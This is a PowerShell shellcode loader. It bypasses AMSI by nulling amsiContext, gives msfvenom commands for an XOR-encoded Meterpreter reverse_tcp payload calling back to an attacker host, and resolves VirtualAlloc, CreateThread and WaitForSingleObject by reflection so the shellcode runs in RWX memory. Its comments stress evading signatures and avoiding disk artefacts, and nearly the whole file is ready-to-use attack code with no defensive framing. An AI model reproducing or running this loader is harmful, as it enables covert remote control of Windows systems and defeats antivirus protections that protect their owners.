# AMSI bypass — amsiContext method (less signatured than amsiInitFailed)
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$a.GetField('amsiContext','NonPublic,Static').SetValue($null,[IntPtr]::Zero)

# ── PASTE XOR-ENCODED SHELLCODE HERE ──────────────────────────────────────────
# Generate with:
#   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 EXITFUNC=thread -f raw -o shell.bin
#   python3 -c "data=open('shell.bin','rb').read();enc=bytes(b^0xfa for b in data);print('[Byte[]] \$buf = '+','.join(f'0x{b:02x}' for b in enc))" > buf.txt
[Byte[]] $buf = 0x00 # <-- replace this line with contents of buf.txt
# ──────────────────────────────────────────────────────────────────────────────

# XOR decode (key 0xfa)
for($i=0;$i -lt $buf.Length;$i++){$buf[$i]=$buf[$i] -bxor 0xfa}

# WinAPI via reflection (no Add-Type, no csc.exe, no temp files)
function LookupFunc {
    Param($m,$f)
    $a=([AppDomain]::CurrentDomain.GetAssemblies()|Where-Object{$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $a.GetMethods()|ForEach-Object{If($_.Name -eq "GetProcAddress"){$tmp+=$_}}
    return $tmp[0].Invoke($null,@(($a.GetMethod('GetModuleHandle')).Invoke($null,@($m)),$f))
}
function getDelegateType {
    Param([Type[]]$func,[Type]$ret=[Void])
    $d=[AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('R')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('M',$false).DefineType('T','Class,Public,Sealed,AnsiClass,AutoClass',[System.MulticastDelegate])
    $d.DefineConstructor('RTSpecialName,HideBySig,Public',[System.Reflection.CallingConventions]::Standard,$func).SetImplementationFlags('Runtime,Managed')
    $d.DefineMethod('Invoke','Public,HideBySig,NewSlot,Virtual',$ret,$func).SetImplementationFlags('Runtime,Managed')
    return $d.CreateType()
}

# Allocate RWX memory, copy shellcode, execute
$lm=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc),(getDelegateType @([IntPtr],[UInt32],[UInt32],[UInt32])([IntPtr]))).Invoke([IntPtr]::Zero,0x1000,0x3000,0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$lm,$buf.length)
$ht=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread),(getDelegateType @([IntPtr],[UInt32],[IntPtr],[IntPtr],[UInt32],[IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$lm,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject),(getDelegateType @([IntPtr],[Int32])([Int32]))).Invoke($ht,0xFFFFFFFF)
